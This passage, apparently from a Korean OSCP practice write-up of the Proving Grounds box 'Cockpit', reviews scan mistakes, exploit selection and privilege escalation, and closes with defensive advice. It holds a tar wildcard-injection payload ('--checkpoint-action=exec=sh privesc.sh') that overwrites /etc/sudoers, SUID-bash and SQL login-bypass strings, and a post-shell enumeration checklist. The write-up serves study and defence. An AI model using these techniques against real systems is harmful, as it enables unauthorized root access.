> 그러니 열 때 **뭘 볼지**를 정해두는 게 낫다. 첫 20줄에서 확인할 것은 셋이다 — **① 제품 식별 줄 ② 대상 버전 ③ 실행 가능한 코드인가(`import`·`#!` 가 있는가)**. 하나라도 안 맞으면 거기서 버린다.
> ①의 필드 이름은 파일마다 다르다. `49397.txt` 는 `# Vendor Homepage:` 를 쓰고 `49390.txt` 는 `# Product:` 를 쓴다. 필드명을 grep 하지 말고 **머리말 전체를 눈으로 훑어라** — 어느 쪽이든 첫 10줄 안에 있다.

### ② 9090 을 디렉터리 브루트포스해서 2시간 반을 태웠다

Cockpit 콘솔을 상대로 네 번 돌렸다. 처음 두 번은 `dirb/common.txt`(4,614행), 나머지 두 번은 `directory-list-2.3-medium.txt`(220,560행 · 주석·빈 줄을 빼면 220,546단어)다. 마지막 회차 결과가 `ferox.txt` 다.

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ wc -l ferox.txt
6997 ferox.txt

┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ grep -c '^200' ferox.txt
6833
```

6,833건의 200. 전부 헛것이다. 크기 분포를 보면 즉시 드러난다.

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ grep '^200' ferox.txt | awk '{print $2,$3,$4,$5}' | sort | uniq -c | sort -rn | head -6
    438 GET 700l 2899w 40222c
    350 GET 647l 2512w 30506c
    346 GET 647l 2573w 34670c
    340 GET 647l 2544w 33282c
    323 GET 647l 2532w 31894c
    317 GET 647l 2451w 27730c
```

같은 바이트 수가 수백 번씩 반복된다. **존재하지 않는 경로에도 같은 페이지를 200 으로 돌려주는 catch-all** 이라는 뜻이다. 찾아낸 경로 목록도 그 성격을 그대로 보여준다.

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ grep '^200' ferox.txt | head -5
200      GET      771l     3095w    43264c http://192.168.150.10:9090/download
200      GET      109l      623w    52583c http://192.168.150.10:9090/cockpit/static/fonts/RedHatDisplay-Medium.woff2
200      GET      771l     3095w    43264c http://192.168.150.10:9090/text/css
200      GET      771l     3095w    43264c http://192.168.150.10:9090/shell/index.html
200      GET      771l     3095w    43264c http://192.168.150.10:9090/@localhost
```

불어난 구조가 통계에 그대로 보인다.

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ grep -oE 'https?://[^ ]+' ferox.txt | sed -E 's#(https?://[^/]+/)([^/]*)/.*#\1\2/#' | sort | uniq -c | sort -rn | head -4
   2946 http://192.168.150.10:9090/text/
   2931 http://192.168.150.10:9090/shell/
      3 http://192.168.150.10:9090/cockpit/
      1 http://192.168.150.10:9090/zuma
```

6,833건 중 **5,877건(86%)이 `/text/` 와 `/shell/` 딱 두 디렉터리 밑**이다. `text` 는 워드리스트 341행, `shell` 은 1688행이다. catch-all 이 둘 다 200 으로 받아주니 feroxbuster 가 **디렉터리로 인정하고 그 아래에 워드리스트 전체를 다시 뿌렸다.** 22만 단어에 `-x` 로 확장자 5개를 붙였으니 **한 번 재귀할 때마다 예정 요청이 약 132만 건씩 늘어난다**(상태파일 `expected_per_scan: 1323276`, `total_expected: 3970062` — 즉 재귀가 세 벌 쌓였다). `/text/css` 는 그렇게 나온 것이다(`css` 는 550행).

`@localhost` 는 워드리스트에 없다. 이건 **링크 추출**이 SPA 안의 문자열을 경로로 오인해 만들어낸 것이다. feroxbuster 2.13.1 에서 링크 추출은 **기본 켜짐**이고(위 배너의 `🔎 Extract Links │ true`), 끄는 플래그는 `--dont-extract-links` 다 — `--help` 에 켜는 쪽 플래그는 아예 없다. 워드리스트에 없는 경로가 결과에 섞여 나오면 이걸 먼저 의심한다.

11:12 에 Ctrl-C 로 끊은 회차의 상태파일에는 이렇게 남아 있다 — 요청 66,771 / 200 응답 23,379 / `wildcards_filtered: 22778` / `resources_discovered: 149`. **feroxbuster 는 와일드카드 응답을 인지해 2만 건 넘게 걸러내고 있었다.** 그 필터를 통과하고도 149건이 "발견"으로 남았고, 다음 회차를 더 오래 돌리자 6,833건이 됐다. 필터가 있어도 catch-all + 재귀 조합은 결국 넘친다.

> [!tip] 결과가 수천 줄이면 이미 틀린 스캔이다
> 판정은 크기 분포 한 줄이면 된다.
> ```bash
> awk '/^200/{print $5}' ferox.txt | sort | uniq -c | sort -rn | head
> ```
> 같은 크기가 수백 번 반복되면 그 크기를 버린다. feroxbuster 2.13.1 기준:
> - `-S <바이트>` / `-N <행수>` — 해당 크기 응답을 제외
> - `--filter-similar-to <URL>` — 그 페이지와 비슷한 응답을 제외
> - `-C 404,200` — 상태코드 제외 필터
> - `--no-recursion` 또는 `-d 1` — **catch-all 상대로는 이게 제일 크다.** 재귀 한 번이 예정 요청을 통째로 한 벌 더 얹는다
>
> 더 근본적으로는 **표적 선정이 틀렸다.** Cockpit·Grafana·Portainer 처럼 **인증 뒤에 있는 관리 콘솔은 자산 트리가 패키지에 고정돼 있어 숨은 경로가 없다.** 브루트포스할 대상이 아니라 **자격증명을 구해서 로그인할 대상**이다. 실제로 이 박스의 답이 정확히 그것이었다.

### ③ 1일차 tcp/80 스캔이 `login.php` 를 놓쳤다

9090 을 포기하고 13:36 부터 tcp/80 을 돌렸는데, 15:32 까지 두 시간을 돌고도 보고된 것이 이게 전부였다 — 200 응답 6건에 디렉터리 리스팅 알림 2줄.

```
200      GET       78l      321w     3349c http://192.168.150.10/index.html
MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.150.10/img (Apache)
200      GET      707l     4190w   598838c http://192.168.150.10/img/blaze.png
200      GET       78l      321w     3349c http://192.168.150.10/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.150.10/js (Apache)
200      GET       29l       85w      913c http://192.168.150.10/js/index.js
200      GET       29l       60w      477c http://192.168.150.10/css/type.css
200      GET      10l       28w      233c http://192.168.150.10/blocked.html
```

`login.php` 가 없다. 1일차는 `directory-list-2.3-medium.txt`, 2일차는 `directory-list-lowercase-2.3-medium.txt` 로 워드리스트가 달랐지만 **`login` 은 양쪽 모두 53행째**다. 즉 스캔 시작 몇 초 안에 요청됐어야 하는 경로가 어느 쪽에서도 늦게 나올 이유가 없는데 1일차에만 보고되지 않았다.

건진 6건을 보면 전부 `index.html` 에서 링크로 도달 가능한 정적 자산이다. **워드리스트 히트가 사실상 하나도 없다.** 그리고 그중에 웹루트의 `blocked.html`(233바이트)이 있다.

정황을 모으면 이렇다 — 9090 에 2시간 반 동안 수만 건을 때린 직후 같은 호스트의 80 을 200스레드로 두들겼고, 웹루트에는 `blocked.html` 이라는 이름의 페이지가 존재하며, 결과는 링크 추출분만 남았다. **스캐너 IP 가 차단됐을 가능성이 크다** `[가정]`. 다음 날 박스가 재배포되어 상태가 초기화된 뒤 같은 성격의 스캔이 곧바로 `login.php` 를 찾은 것도 이 가정과 부합한다(2일차 `.state` 는 41,154요청 시점에 이미 `login.php` 를 발견 목록에 담고 있다). 다만 `blocked.html` 의 내용을 확인한 기록은 없고 타겟도 이미 사라져 확정할 수 없다.

> [!warning] `-t 200` 은 공짜가 아니다
> 스캔 결과가 **비정상적으로 적을 때** 의심할 것은 "이 사이트는 원래 이렇다" 가 아니라 **내가 차단당했다** 쪽이다. 확인법은 싸다 — 이미 200 이 나왔던 경로(`/index.html`) 하나를 `curl -i` 로 다시 때려보면 된다. 여전히 200 이면 사이트가 원래 그런 것이고, 403 이나 낯선 페이지가 오면 차단이다.
> 그리고 **차단 흔적이 결과 목록 안에 있었다.** `blocked.html` 을 발견해놓고 열어보지 않았다.

### ④ 권한상승 1차 페이로드를 폐기했다

13:01 에 `sudo -l` 로 답을 봤는데 root 는 13:52 다. 그 사이 13:36 에 찍힌 스크린샷이 첫 번째 시도다. 원본 노트에는 없던 화면이다.

![[Pasted image 20260626133613.png]]

```
james@blaze:~$ echo "" > '--checkpoint=1'
james@blaze:~$ ls
'--checkpoint=1'   local.txt
james@blaze:~$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
james@blaze:~$ vi privesc.sh
james@blaze:~$ cat privesc.sh
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

출처: `파일보관/Pasted image 20260626133613.png`. 페이로드가 두 군데 틀렸다.

**`kali` 는 이 호스트에 없는 계정이다.** 공격 머신의 사용자명이 그대로 들어갔다. 실행돼도 james 가 얻는 건 없다.

**`>` 로 `/etc/sudoers` 를 통째로 덮어쓴다.** 성공하면 `james … NOPASSWD: /usr/bin/tar …` 규칙이 사라진다. 즉 **유일한 권한상승 통로를 자기 손으로 닫는** 페이로드다. 리버트 말고는 복구가 없다.

이게 실행됐는지는 화면에 없다. 다만 16분 뒤 `sudo tar` 가 정상 동작해 root 를 잡았으므로 **`/etc/sudoers` 는 그 시점에 온전했다.** 그래서 실행 전에 페이로드를 갈아엎었다고 본다 `[가정]`.

또 하나, 1차는 홈 디렉터리(`~`)에서 준비했고 2차는 `/tmp` 로 옮겼다. sudo 규칙의 `*` 는 셸의 현재 디렉터리에서 확장되므로 `~` 에서도 원리상 통한다. 옮긴 이유는 기록에 없다.

> [!tip] 권한상승 페이로드의 원칙 — 되돌릴 수 있는 것부터
> `chmod +s /bin/bash`, `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash`, 리버스셸 — 전부 **기존 설정을 건드리지 않는다.**
> 반대로 `/etc/sudoers` 나 `/etc/passwd` 를 **`>` 로 덮어쓰는 것**은 실패하면 박스를 죽인다. 꼭 해야 하면 `>>` 로 추가하고, 그전에 원본을 백업한다. 시험 중이라면 리버트가 시간 손실 그 자체다.
> 그리고 **페이로드 안의 사용자명은 항상 타겟 기준으로 다시 읽어라.** 다른 박스에서 복사해온 한 줄에 `kali` 가 남아 있는 건 흔한 사고다.

### ⑤ 기록이 없는 108분

`local.txt` 를 잡은 11:13 부터 `sudo -l` 을 찍은 13:01 까지 어떤 산출물도 스크린샷도 없다. 자리를 비운 것으로 보이고(점심 시간대와 겹친다) 기술적 시행착오였다는 근거는 없다.

의미는 다른 데 있다. **`sudo -l` 한 줄로 끝나는 박스에서 셸을 잡고 108분이 지나서야 그 한 줄을 쳤다.** 셸을 잡은 직후 30초는 반사적으로 다음을 돌려야 한다.

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
```

## 7. OSCP 시험 관점

1. **`searchsploit` 결과는 열기 전에 제품을 확인한다.** `searchsploit -p <ID>` 가 `Path` 와 `File Type` 을 보여주고, 파일 머리말에 제품 식별 줄(`Vendor Homepage:` 또는 `Product:`)과 대상 버전이 있다. 이름이 흔한 단어인 서비스일수록 필수다.

2. **로그인 폼을 만나면 `'` 보다 `%` 와 빈 값을 먼저 넣어본다.** `LIKE` 로 짠 쿼리는 인젝션 없이 통과한다. 그 다음이 `' or 1=1-- `, 그 다음이 에러 유도다. 이 박스는 에러 메시지가 쿼리 모양(`like '%…%'`)을 통째로 알려줬다 — **에러 문구를 되짚어 원본 쿼리를 복원하는 습관**이 그대로 수동 인젝션 설계로 이어진다.

3. **자동 도구 없는 대안.** 이 박스는 원래 자동 도구가 필요 없다. 디렉터리 열거는 `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php` 로 충분했고(`common.txt` 2347행에 `login` 이 있으니 `-x php` 와 함께면 `login.php` 가 요청된다), 인증 우회는 브라우저에 글자 하나 치는 것이고, 권한상승은 `sudo -l` 이다. `sqlmap` 은 시험 금지이고 여기서는 애초에 쓸 일이 없다.

4. **웹 기반 셸에서 플래그를 읽지 마라.** Cockpit·Webmin·Wetty·Guacamole·개발자 콘솔 전부 해당한다. 자격증명을 이미 손에 쥐었다면 **SSH·WinRM·RDP 같은 진짜 세션으로 갈아탄 뒤** 원위치에서 `cat` 한다. 이 박스는 22번이 열려 있었으니 비용이 0이었는데도 **두 플래그 다 브라우저 터미널에서 읽었다** — 시험이었다면 100점짜리 박스가 0점이다. 한 번 웹 셸에 자리를 잡으면 그 뒤 모든 작업이 관성으로 거기서 이어진다는 게 이 박스의 진짜 교훈이다.

5. **`sudo -l` 규칙 끝의 `*` 를 읽는 법.** `*` 가 있으면 그 프로그램의 옵션이 전부 열려 있다 → GTFOBins 항목을 그대로 붙인다. `*` 가 없고 인자가 고정이면 → 글로브 확장을 노린 파일명 트릭으로 간다.

6. **시간 배분.** 이 박스에서 손절선은 두 개였다.
   - **exploit-db 에서 받은 파일은 실행 전에 열고 제품명·대상 버전·코드 여부를 본다.** 이 박스에서는 열어보고도 실행했다 — 열었다는 사실만으로는 부족하고, **무엇을 확인할지**를 정해두지 않으면 눈만 스친다.
   - **디렉터리 브루트포스 결과가 200줄을 넘어가면 그 스캔은 버린다.** 여기서는 2시간 반을 흘려보냈다. 5분 시점에 크기 분포만 봤어도 끝났다.

   그리고 셸을 잡은 뒤 `sudo -l` 까지 108분이 걸렸다. 시험 24시간에서 이런 공백 두 번이면 박스 하나가 날아간다.

7. **PG 박스는 리버트되면 IP 가 바뀐다.** 이 노트의 1일차·2일차 IP 가 다른 이유다. 노트에 IP 를 박아둘 때는 어느 세션의 것인지 함께 적어야 나중에 자기 기록을 의심하지 않는다.

## 8. 방어 관점

- **로그인 쿼리에 `LIKE` 를 쓰지 않는다.** 인증은 정확일치(`=`) 여야 하고, 값은 prepared statement 로 바인딩한다. 검색용 헬퍼를 인증에 재사용한 것이 근본 원인이다.
- **DB 에러를 사용자에게 보여주지 않는다.** `'` 하나에 돌아온 MySQL 문법 에러가 DBMS 종류와 쿼리 구조를 동시에 넘겨줬다.
- **비밀번호를 base64 로 "보관" 하지 않는다.** 인코딩은 보호가 아니다. bcrypt·argon2 같은 솔트 적용 단방향 해시를 쓴다.
- **관리 화면이 비밀번호 컬럼을 렌더링하지 않는다.** 해시로 바꿔도 목록 화면에 뿌릴 이유가 없다.
- **웹앱 계정과 OS 계정의 비밀번호를 분리한다.** 여기서는 웹 DB 유출 하나가 곧바로 호스트 로그인이 됐다.
- **Cockpit 을 인터넷/평평한 네트워크에 노출하지 않는다.** 관리 콘솔은 VPN·bastion 뒤에 두고, 최소한 방화벽으로 9090 을 제한한다.
- **`sudo` 규칙에 와일드카드를 넣지 않는다.** `sudoers(5)` 자체가 *"Wildcards in command line arguments should be used with care"* 라고 경고한다. 백업이 목적이면 인자를 고정한 래퍼 스크립트를 등록하고, 그 스크립트 안에서 경로를 절대경로로 못 박는다.

## 9. 참고 자료

- GTFOBins — [tar](https://gtfobins.github.io/gtfobins/tar/) (`sudo` 항목의 `--checkpoint-action=exec=`)
- `man 5 sudoers` — "Wildcards" 절. 인자 자리의 `*` 가 공백·슬래시를 매칭한다는 근거
- GNU tar manual — `--checkpoint`, `--checkpoint-action`
- Cockpit 프로젝트 — https://cockpit-project.org/ (nmap 이 가리킨 실제 제품)
- EDB [49390](https://www.exploit-db.com/exploits/49390) — **이 박스와 무관.** Cockpit *CMS* 0.6.1 RCE. 이름 충돌 사례로만 남긴다
- EDB [49397](https://www.exploit-db.com/exploits/49397) — Cockpit v234 SSRF. 제품은 맞지만 버전이 안 맞는다

## 남긴 흔적

타겟(이미 회수됨)에 남긴 것:
- `/tmp/privesc.sh`, `/tmp/backup.tar.gz`, `/tmp/--checkpoint=1`, `/tmp/--checkpoint-action=exec=sh privesc.sh`
- `~/--checkpoint=1`, `~/--checkpoint-action=exec=sh privesc.sh`, `~/privesc.sh` (1차 시도분)
- `/bin/bash` 에 **SUID 비트** — 이건 지우는 게 아니라 되돌려야 한다: `chmod u-s /bin/bash`. 되돌린 기록은 없다.

공격 머신:
- `~/PG/Cockpit/` 에 `nmap.log`·`49390.py`·`ferox.txt`·`ferox_80.txt`·상태파일 2개
- 이 노트 작성 중 sudoers 인자 매칭을 검증하려고 Kali 에 `/etc/sudoers.d/ztest` 를 잠시 두었다가 제거했다. `/tmp/ztest`·`/tmp/backup.tar.gz` 도 삭제 확인.
  journald 에 `2026-08-20 13:40:00` 의 `install -m 440 … /etc/sudoers.d/ztest` 부터 `13:40:24` 의 `rm -f /etc/sudoers.d/ztest /tmp/ztest /tmp/backup.tar.gz` 까지 전부 남아 있고, 현재 `/etc/sudoers.d/` 에는 배포 기본 파일 4개뿐이다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Zipper]] — 같은 **와일드카드 인젝션**. 저쪽은 `sudo` 가 아니라 root 크론의 `7za a … *.zip` 이고 `@리스트파일` + 심볼릭 링크로 파일을 읽어냈다. 여기는 `tar --checkpoint-action` 으로 실행. **글로브가 인자 자리에 들어가면 파일명이 옵션이 된다**는 같은 원리다. 자격증명 재사용도 공통.
- [[Crane]] · [[Pelican]] · [[RubyDome]] · [[Clue]] — `sudo -l` 한 줄로 끝나는 GTFOBins 권한상승 모음
- [[Sorcerer]] · [[Astronaut]] — SUID 바이너리 계열
- [[Hub]] — **버전 판정은 독립 근거 2개**. 여기서는 nmap 이 준 구간(198–220)을 좁히지도 않고 **이름만으로** 검색해 다른 제품의 익스플로잇을 집었다. 정확히 그 반대 사례다
- [[_STATUS]]
